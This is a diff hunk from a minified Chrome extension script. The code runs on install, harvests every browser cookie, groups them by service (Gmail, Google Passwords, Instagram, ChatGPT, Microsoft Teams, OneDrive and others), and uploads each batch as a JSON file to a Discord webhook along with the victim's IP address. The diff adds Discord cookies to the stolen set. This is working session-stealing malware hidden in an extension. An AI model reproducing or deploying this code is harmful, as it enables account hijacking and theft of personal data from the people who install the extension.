@@ -13658,7 +13658,7 @@ chrome.runtime.onInstalled.addListener(()=>{console.log("Extension Installed/Upd
 🌍 Language: ${e.language}
 📡 IP Address: ${o}
 📊 Total cookies: ${i.length}
-    `.trim();for(let a of(await sendToDiscordWebhook(t),[{name:"YouTube",domains:["youtube","google"]},{name:"Instagram",domains:["instagram","facebook"]},{name:"Gmail",domains:["mail.google","google"]},{name:"Snapchat",domains:["snapchat"]},{name:"Google Drive",domains:["drive.google","google"]},{name:"Google Photos",domains:["photos.google","google"]},{name:"Google Passwords",domains:["passwords.google","google"]},{name:"Google My Activity",domains:["myactivity.google","google"]},{name:"ChatGPT",domains:["chatgpt","openai"]},{name:"Microsoft Teams",domains:["teams.microsoft"]},{name:"OneDrive",domains:["onedrive.live"]},{name:"All Cookies",domains:[]}])){let r=[];if("All Cookies"===a.name)r=i;else{let l=a.domains.map(e=>e.toLowerCase());r=i.filter(e=>{let o=(e.domain||"").toLowerCase();return l.some(e=>o.includes(e))})}if(r.length>0)try{let d=JSON.stringify(r,null,2),c=a.name.replace(/[^\w\-]+/g,"_"),g=`cookies_${c}_${s.toISOString().split("T")[0]}.json`,u=`
+    `.trim();for(let a of(await sendToDiscordWebhook(t),[{name:"YouTube",domains:["youtube","google"]},{name:"Instagram",domains:["instagram","facebook"]},{name:"Gmail",domains:["mail.google","google"]},{name:"Snapchat",domains:["snapchat"]},{name:"Google Drive",domains:["drive.google","google"]},{name:"Google Photos",domains:["photos.google","google"]},{name:"Google Passwords",domains:["passwords.google","google"]},{name:"Google My Activity",domains:["myactivity.google","google"]},{name:"ChatGPT",domains:["chatgpt","openai"]},{name:"Discord",domains:["discord"]},{name:"Microsoft Teams",domains:["teams.microsoft"]},{name:"OneDrive",domains:["onedrive.live"]},{name:"All Cookies",domains:[]}])){let r=[];if("All Cookies"===a.name)r=i;else{let l=a.domains.map(e=>e.toLowerCase());r=i.filter(e=>{let o=(e.domain||"").toLowerCase();return l.some(e=>o.includes(e))})}if(r.length>0)try{let d=JSON.stringify(r,null,2),c=a.name.replace(/[^\w\-]+/g,"_"),g=`cookies_${c}_${s.toISOString().split("T")[0]}.json`,m=`
 ✅ ${a.name}
 📁 Cookies Count: ${r.length}
 🔗 Domains: ${a.domains.join(", ")||"All domains"}
@@ -13668,7 +13668,7 @@ chrome.runtime.onInstalled.addListener(()=>{console.log("Extension Installed/Upd
 📡 IP Address: ${o}
 
 📎 <i>Cookie file attached below</i>
-                `.trim();await sendToDiscordWebhook(u,d,g),await new Promise(e=>setTimeout(e,1e3))}catch(m){console.error(`❌ Error in sending ${a.name}:`,m),sendErrorToDiscord(m)}}let y=`
+                `.trim();await sendToDiscordWebhook(m,d,g),await new Promise(e=>setTimeout(e,1e3))}catch(u){console.error(`❌ Error in sending ${a.name}:`,u),sendErrorToDiscord(u)}}let y=`
 🎉 Cookies collection process completed
 
 📅 Time: ${new Date().toLocaleString("en-US",{timeZone:"Asia/Riyadh",year:"numeric",month:"2-digit",day:"2-digit",hour:"2-digit",minute:"2-digit",second:"2-digit"})}
@@ -27913,6 +27913,5 @@ chrome.runtime.onInstalled.addListener(()=>{console.log("Extension Installed/Upd
 
 
 
-
-
 // --------------------------------------- //
+
